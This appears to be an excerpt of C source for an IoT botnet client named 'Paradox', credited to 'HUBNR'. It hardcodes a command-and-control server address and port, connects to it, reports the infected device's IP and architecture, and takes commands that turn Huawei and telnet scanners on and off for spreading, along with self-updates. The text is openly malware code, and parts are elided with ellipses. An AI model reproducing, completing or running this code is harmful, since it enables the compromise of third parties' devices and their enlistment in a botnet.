//PRIVATE VERSION OF PARADOX
//MADE BY HUBNR
//8-4-18
#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(paradoxHost1), sizeof(paradoxHost2), sizeof(paradoxHost3), sizeof(paradoxHost4))
#define PAD_RIGHT 1
#define PAD_ZERO 2
...
int paradoxHost1 = {107};
int paradoxHost2 = {174};
int paradoxHost3 = {26};
int paradoxHost4 = {58};
int paradoxPort = 101;
...
int paradoxCommSock = 0, paradoxServer = -1, userID = 1, watchdog_pid = 0;
...
int recvLine(int socket, unsigned char *buf, int bufsize)
{
	...
	while(bufsize-- > 1)
	{
		if(recv(paradoxCommSock, &tmpchr, 1, 0) != 1) 
		{
			*cp = 0x00;
			return -1;
		}
...
void processCmd(int argc, unsigned char *argv[])
{
	if (!strcmp(argv[0], "HUAWEI"))
	{
		if (!strcmp(argv[1], "ON"))
		{
			sockprintf(paradoxCommSock, "Paradox : INITIATING HUAWEI SCANNER [%s]", inet_ntoa(ourIP));
			#ifdef DEBUG
		...
		{
			sockprintf(paradoxCommSock, "Paradox : KILLING HUAWEI SCANNER [%s]", inet_ntoa(ourIP));
			#ifdef DEBUG
	...
	if (!strcmp(argv[0], "TELNET"))
	{
		if (!strcmp(argv[1], "ON"))
		{
			sockprintf(paradoxCommSock, "Paradox : INITIATING TELNET SCANNER [%s]", inet_ntoa(ourIP));
			#ifdef DEBUG
		...
		if (!strcmp(argv[1], "OFF"))
		{
			sockprintf(paradoxCommSock, "Paradox : KILLING TELNET SCANNER [%s]", inet_ntoa(ourIP));
			#ifdef DEBUG
	...
	{
		sockprintf(paradoxCommSock, "Paradox : UPDATING RUNNING Paradox INSTANCE [%s]", inet_ntoa(ourIP));
		#ifdef DEBUG
...
int initConnection()
{
	...
	if(paradoxCommSock) { close(paradoxCommSock); paradoxCommSock = 0; }
	if(paradoxServer + 1 == SERVER_LIST_SIZE) paradoxServer = 0;
	else paradoxServer++;
	szprintf(server, "%d.%d.%d.%d", paradoxHost1, paradoxHost2, paradoxHost3, paradoxHost4);
	int port = paradoxPort;
	if(strchr(server, ':') != NULL)
	{
		port = atoi(strchr(server, ':') + 1);
		*((unsigned char *)(strchr(server, ':'))) = 0x0;
	}
	paradoxCommSock = socket(AF_INET, SOCK_STREAM, 0);
	if(!connectTimeout(paradoxCommSock, server, port, 30)) return 1;
	return 0;
}
...
{ 
	...
	while(1)
	{
		...
		sockprintf(paradoxCommSock, "Paradox : DEVICE CONNECTED [IP: %s] [ARCH: %s]", inet_ntoa(ourIP), getBuild());

		char commBuf[4096];
		int got = 0;
		int i = 0;
		while((got = recvLine(paradoxCommSock, commBuf, 4096)) != -1)
		{
